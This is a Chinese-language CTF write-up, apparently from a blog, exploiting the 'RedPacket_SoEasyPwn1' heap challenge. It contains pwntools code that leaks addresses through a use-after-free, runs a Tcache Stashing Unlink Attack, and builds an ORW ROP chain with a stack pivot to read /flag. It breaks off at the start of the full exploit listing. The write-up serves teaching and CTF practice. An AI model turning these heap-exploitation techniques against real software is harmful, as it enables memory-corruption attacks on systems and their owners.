class="hljs-built_in">readd</span>();<br>  <span class="hljs-keyword">if</span> ( v2 &gt; <span class="hljs-number">0x10</span> || !*(<span class="hljs-number">16LL</span> * v2 + a1) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(*(<span class="hljs-number">16LL</span> * v2 + a1));<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Done!"</span>);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h2 id="栈溢出函数"><a href="#栈溢出函数" class="headerlink" title="栈溢出函数"></a>栈溢出函数</h2><p>执行栈溢出函数需要满足*(first_chunk + 2048)&gt; 0x7F0000000000且*(first_chunk + 2040) 和 *(first_chunk + 2056)值为0。first_chunk就是我们申请的第一个chunk。</p>
<figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">ssize_t</span> <span class="hljs-title">sub_13BD</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-80h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( *(first_chunk + <span class="hljs-number">2048</span>) &lt;= <span class="hljs-number">0x7F0000000000</span>LL || *(first_chunk + <span class="hljs-number">2040</span>) || *(first_chunk + <span class="hljs-number">2056</span>) )<br>    <span class="hljs-built_in">exitt</span>();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You get red packet!"</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"What do you want to say?"</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x90</span>uLL);<br>}<br></code></pre></td></tr></tbody></table></figure>

<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>因为存在一个栈溢出的漏洞，我们可以使用堆ROP，而要想利用栈溢出漏洞需要将*(first_chunk + 2048)修改为一个大于0x7F0000000000的值，而*(first_chunk + 2040)和 *(first_chunk + 2056)本来就是0，保持不变即可。calloc函数分配堆块，chunk不会从tcache bin中取。程序至少可以分配两种不同大小且大小为unsorted bin的Chunk（0x300和0x400）。这里我们可以使用Tcache Stashing Unlink Attack。</p>
<h1 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h1><p>先把前面的写好</p>
<figure class="highlight vim"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vim"># coding=utf-<span class="hljs-number">8</span><br>from pwn import *<br>context(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>) <br><br><span class="hljs-keyword">sh</span> = process(<span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>)<br>#sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-string">'27283'</span>)<br><br>libc=ELF(<span class="hljs-string">"./libc-2.29.so"</span>)<br><br> <br> <br><br>s       = lambda data               :<span class="hljs-keyword">sh</span>.send(data)<br><span class="hljs-keyword">sa</span>      = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendafter(delim, data)<br><span class="hljs-keyword">sl</span>      = lambda data               :<span class="hljs-keyword">sh</span>.sendline(data)<br><span class="hljs-keyword">sla</span>     = lambda delim,data         :<span class="hljs-keyword">sh</span>.sendlineafter(delim, data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :<span class="hljs-keyword">sh</span>.recv(num)<br><span class="hljs-keyword">ru</span>      = lambda delims		    :<span class="hljs-keyword">sh</span>.recvuntil(delims)<br>itr     = lambda                    :<span class="hljs-keyword">sh</span>.interactive()<br>uu32    = lambda data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-keyword">lg</span>      = lambda address,data       :<span class="hljs-built_in">log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br>def dbg():<br>        gdb.attach(<span class="hljs-keyword">sh</span>)<br>        pause()<br> <br><br>def <span class="hljs-built_in">add</span>(<span class="hljs-built_in">index</span>,chunk_size_index,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'1'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): '</span>)<br>    <span class="hljs-keyword">sl</span>(str(chunk_size_index))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span class="hljs-keyword">sl</span>(value)<br><br>def free(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'2'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br><br>def <span class="hljs-keyword">edit</span>(<span class="hljs-built_in">index</span>,value):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'3'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input content: '</span>)<br>    <span class="hljs-keyword">sl</span>(value)<br><br>def show(<span class="hljs-built_in">index</span>):<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Your input: '</span>)<br>    <span class="hljs-keyword">sl</span>(<span class="hljs-string">'4'</span>)<br>    <span class="hljs-keyword">ru</span>(<span class="hljs-string">'Please input the red packet idx: '</span>)<br>    <span class="hljs-keyword">sl</span>(str(<span class="hljs-built_in">index</span>))<br></code></pre></td></tr></tbody></table></figure>

<h2 id="构造tcache-bin"><a href="#构造tcache-bin" class="headerlink" title="构造tcache bin"></a>构造tcache bin</h2><p>首先我们要获得unsorted bin的chunk，需要先填满0x400大小的tcache bin，填0x300大小的tcache bin只剩1个</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#<span class="hljs-number">1.0</span>x10 <span class="hljs-number">2.0</span>xf0 <span class="hljs-number">3.0</span>x300 <span class="hljs-number">4.0</span>x400<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_15'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">15</span>)<br><br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-string">'Chunk_14'</span>)<br>    <span class="hljs-built_in">free</span>(<span class="hljs-number">14</span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c84cb045a70c47868706c89a5ffab3a4.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>此时我们利用UAF可以泄露出heap地址</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">15</span>)</span></span><br>last_chunk_addr = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'last_chunk_addr'</span>,last_chunk_addr)</span></span><br>heap_addr = last_chunk_addr - <span class="hljs-number">0</span>x26C0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'heap_addr'</span>,heap_addr)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/58412fdbeaef4e3db7f7166362a15ab9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="利用unsorted-bin构造两个small-bin-chunk"><a href="#利用unsorted-bin构造两个small-bin-chunk" class="headerlink" title="利用unsorted bin构造两个small bin chunk"></a>利用unsorted bin构造两个small bin chunk</h2><blockquote>
<p>当我们申请一个chunk时，如果unsorted bin里有chunk，而我们所申请的chunk大小小于unsorted bin里的chunk，那么就把unsorted bin的chunk分割，拿出我们需要的大小申请chunk，剩下的继续留在unsorted bin中，<br>而如果我们申请的chunk大小大于unsorted bin中的chunk，那么就会把unsorted bin中的chunk，按照大小放入对应的bin中，之后再从top chunk中申请一个chunk。</p>
</blockquote>
<p>我们可以先申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），之后free 大小为0x400的chunk，再申请两次0x300大小的chunk，第一次申请的chunk会从0x400大小的chunk里切割出0x300，unsorted bin还剩0x100大小的chunk，第二次申请的chunk由于大于unsorted bin中的chunk，会将unsorted bin中的0x100大小的chunk放进small bin，我们利用同样的方法可以再次得到一个small bin的chunk，这样我们就得到了两个small bin chunk。</p>
<p>申请一个0x400大小的chunk，再申请一个0x300大小的chunk（防止合并），可以看到tcachebin中的chunk没有被拿走。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/4bc407062a4647f0ab2256d8f7547c82.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>我们free chunk1，因为chunk1大小为0x400，tcachebin中0x400大小的chunk已满了7个，所以进入unsorted bin，利用UAF泄露libc基地址</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br>libc_base = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.strip</span>(<span class="hljs-string">'\x0A'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x1E4CA0<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc_base'</span>,libc_base)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/6136120230264abc9181165746e485f1.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>申请0x300大小的chunk，在unsortedbin里寻找大小为0x300的chunk，分割unsortedbin 里的chunk，拿出0x300，还剩0x100</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/beb46b48f5e84c63bcd8d4825b23d04b.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>在unsortedbin里寻找大小为0x300的chunk，此时unsortedbin中chunk只有0x100大小，0x100的chunk进入smallbin，从top chunk中分配0x300大小的chunk，成功制造一个small bin chunk</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/e93cba834b9e405d828b6a1a0bbc1ea9.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>利用同样方法再构造一个small bin chunk</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_2'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">2</span>)</span></span><br><br><span class="hljs-selector-id">#dbg</span>()<br><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'Chunk_13'</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b555f84d5da64f6d800060cc087cc9f6.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<p>并借此我们找到size大小为0x1010的就是first_chunk，借此我们算出刚刚泄露出的heap+ 0x250+0x10+0x800-0x10就是first_chunk+0x800的地址，small bin chunk2的fd指针指向small bin chunk1不变，所以我们还要算出small bin chunk1距离heap的距离0x37e0</p>
<h2 id="修改small-bin-chunk的bk指针为first-chunk-0x800"><a href="#修改small-bin-chunk的bk指针为first-chunk-0x800" class="headerlink" title="修改small bin chunk的bk指针为first_chunk+0x800"></a>修改small bin chunk的bk指针为first_chunk+0x800</h2><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x300+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x101)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x37E0)+<span class="hljs-built_in">p64</span>(heap_addr+<span class="hljs-number">0</span>x250+<span class="hljs-number">0</span>x10+<span class="hljs-number">0</span>x800-<span class="hljs-number">0</span>x10)<br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">2</span>,payload)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/0812f3a1c86243a681acb859b56aebbb.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"><br>再次申请0x100大小的chunk，<strong>程序仅会检查Chunk2的fd指针是否指向Chunk1</strong>，在取出Chunk1后，因为0x100的Tcache Bin还有1个空位，程序会遍历发现Chunk2满足大小条件并将其放入Tcache Bin中，我们若此时篡改Chunk2的bk指针指向first_chunk+0x800，触发Tcache Stashing Unlink Attack将main_arena+336写入first_chunk+0x800，满足first_chunk+0x800大于0x7F0000000000.</p>
<p class='item-img' data-src='https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/c622ed9425cb4e63a1527f1b98668250.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="构造ORW的ROP链放入堆块中"><a href="#构造ORW的ROP链放入堆块中" class="headerlink" title="构造ORW的ROP链放入堆块中"></a>构造ORW的ROP链放入堆块中</h2><p>先获取一些gadget段， file_name_addr是我们要申请的下一个chunk的mem地址，也就是当前的top chunk的mem地址，距离heap 0x0000000000004A40</p>
<figure class="highlight ini"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026542<br><span class="hljs-attr">pop_rsi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000026f9e<br><span class="hljs-attr">pop_rdx_ret</span> = libc_base + <span class="hljs-number">0</span>x000000000012bda6<br><span class="hljs-attr">file_name_addr</span> = heap_addr + <span class="hljs-number">0</span>x0000000000004A40 <span class="hljs-comment">#下一个chunk的mem位置起始位置</span><br><span class="hljs-attr">flag_addr</span> = file_name_addr + <span class="hljs-number">0</span>x0000000000000200 <span class="hljs-comment">#将flag写到file_name_addr + 0x0000000000000200处，防止覆盖掉有用内容</span><br><span class="hljs-attr">ROP_chain</span>  = <span class="hljs-string">'/flag\x00\x00\x00'</span><br></code></pre></td></tr></tbody></table></figure>

<p>open(file_name_addr,0)</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(file_name_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'open'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>read(3,flag_addr,0x40)<br>Read函数的第一个参数文件描述符从0开始累加，<br>程序进行时内核会自动打开3个文件描述符，0，1，2，分别对应，标准输入、输出和出错，<br>这样在程序中，每打开一个文件，文件描述符值从3开始累加。<br>我们打开了一个file_name_addr文件，文件描述符就变为了3，3就代表了file_name_addr文件<br>read函数第一个参数是3，就是在这个文件里读取数据。</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">3</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'read'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>write(1,flag_addr,0x40)</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">1</span>)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rsi_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(flag_addr)<br>ROP_chain += <span class="hljs-built_in">p64</span>(pop_rdx_ret)<br>ROP_chain += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x40)<br>ROP_chain += <span class="hljs-built_in">p64</span>(libc_base+libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'write'</span>]</span>)<br></code></pre></td></tr></tbody></table></figure>

<p>申请chunk，将ROP链写到chunk里</p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">4</span>,ROP_chain)</span></span><br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<p class='item-img' data-src='https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/b613b47921cb452786368b3e600ad61f.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>利用read(0, buf, 0x90uLL);buf0x80字节，正好可以溢出0x10字节，进行栈迁移，将程序迁移到我们最新申请的chunk处执行我们的ROP链。<br class='item-img' data-src='https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288'><img src="https://img-blog.csdnimg.cn/a332540cc3894122be74f0675a766eff.png?ynotemdtimestamp=1663776368288" alt="在这里插入图片描述"></p>
<figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">leave_ret = libc_base + <span class="hljs-number">0</span>x0000000000058373<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'Your input: '</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'666'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'What do you want to say?'</span>)</span></span><br>#栈迁移<br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'A'</span>*<span class="hljs-number">0</span>x80 + p64(file_name_addr)</span></span> + <span class="hljs-built_in">p64</span>(leave_ret))<br><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure>

<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 